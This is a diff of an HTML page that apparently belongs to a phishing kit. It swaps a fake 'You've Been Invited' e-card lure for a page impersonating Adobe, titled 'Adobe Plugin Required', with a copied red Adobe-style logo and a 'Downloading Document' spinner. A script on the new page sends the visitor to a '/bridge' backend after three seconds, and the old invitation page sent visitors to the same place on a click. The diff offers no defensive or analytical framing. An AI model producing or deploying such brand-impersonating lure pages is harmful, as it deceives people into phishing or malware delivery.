@@ -1,43 +1,33 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>You've Been Invited</title>
-  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;500&family=Jost:wght@300;400&display=swap" rel="stylesheet">
-  <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
-    html, body { height:100%; background:#131315; color:#efe9df; font-family:'Jost',sans-serif; }
-    body { display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:44px 24px; }
-    .frame { position:relative; max-width:540px; width:100%; padding:58px 40px 50px 40px; }
-    .frame:before { content:''; position:absolute; inset:14px; border:1px solid rgba(239,233,223,.18); pointer-events:none; }
-    .orn { width:58px; height:58px; margin:0 auto 30px auto; opacity:.92; }
-    .eyebrow { font-size:11px; letter-spacing:6px; text-transform:uppercase; color:rgba(239,233,223,.55); margin-bottom:30px; }
-    .letter { font-family:'Cormorant Garamond',serif; font-size:27px; line-height:1.55; color:#efe9df; }
-    .btn { display:inline-block; margin-top:46px; padding:14px 42px; border:1px solid rgba(239,233,223,.55); color:#efe9df; font-size:12px; letter-spacing:5px; text-transform:uppercase; cursor:pointer; background:transparent; }
-    .loader { position:fixed; inset:0; background:#131315; display:none; align-items:center; justify-content:center; flex-direction:column; gap:20px; z-index:50; }
-    .spin { width:34px; height:34px; border:2px solid rgba(239,233,223,.18); border-top-color:#efe9df; border-radius:50%; animation:sp .8s linear infinite; }
-    @keyframes sp { to { transform:rotate(360deg); } }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Plugin Required</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #ffffff; }
+        .logo { width: 120px; margin-bottom: 20px; }
+        .status { font-size: 24px; color: #333; margin-bottom: 20px; font-weight: 500; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #ed2224; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-  <div class="frame">
-    <svg class="orn" viewBox="0 0 64 64" fill="none"><rect x="7" y="16" width="50" height="32" rx="2" stroke="rgba(239,233,223,.75)" stroke-width="1.4"/><path d="M8 19 L32 37 L56 19" stroke="rgba(239,233,223,.75)" stroke-width="1.4" fill="none"/></svg>
-    <div class="eyebrow">You&rsquo;ve Been Invited</div>
-    <div class="letter">Work, life, and everything in between&mdash;we&rsquo;re bringing all our favorite people together under one roof. <em>We&rsquo;d love for you to be part of the mix!</em></div>
-    <a class="btn" id="view" href="#">View the Card</a>
-  </div>
-  <div class="loader" id="loader"><div class="spin"></div><div style="font-size:12px; letter-spacing:4px; text-transform:uppercase; color:rgba(239,233,223,.6);">Opening your invitation&hellip;</div></div>
+    <!-- Use a generic SVG or base64 Adobe logo here -->
+    <svg class="logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+        <rect x="0" y="0" width="100" height="100" rx="22" fill="#ed2224"/>
+        <polygon points="24,80 44,24 53,49 44,80" fill="#fff"/>
+        <polygon points="58,80 76,24 76,80 67,80" fill="#fff"/>
+    </svg>
+    
+    <div class="status">Downloading Document</div>
+    <div class="spinner"></div>
 
-  <script>
-    document.getElementById('view').addEventListener('click', function (e) {
-      e.preventDefault();
-      document.getElementById('loader').style.display = 'flex';
-      setTimeout(function () {
-        // Redirect to our Node.js bridge
-        window.location.href = "/bridge";
-      }, 2000);
-    });
-  </script>
+    <script>
+        // Redirect to the bridge after 3 seconds
+        setTimeout(function() {
+            window.location.href = "/bridge";
+        }, 3000);
+    </script>
 </body>
 </html>
